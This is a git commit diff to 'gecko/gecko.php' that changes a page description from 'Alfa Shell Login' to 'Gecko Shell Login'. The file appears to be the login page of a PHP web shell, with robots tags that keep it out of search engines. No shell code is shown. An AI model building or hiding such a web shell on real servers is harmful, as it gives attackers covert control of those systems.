0638812c57662a327e9055fd8b728f67a27bcc10
NuLz <129581037+haxorstars@users.noreply.github.com>
2023-06-27 15:54:38 +0700

    Add files via upload

--- gecko/gecko.php
+++ gecko/gecko.php
@@ -34,7 +34,7 @@ if (empty($_SESSION['login'])) {
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <meta name="description" content=".:Alfa Shell Login:. | Edited By NuLz" />
+    <meta name="description" content=".:Gecko Shell Login:. | Login GUI By NuLz" />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
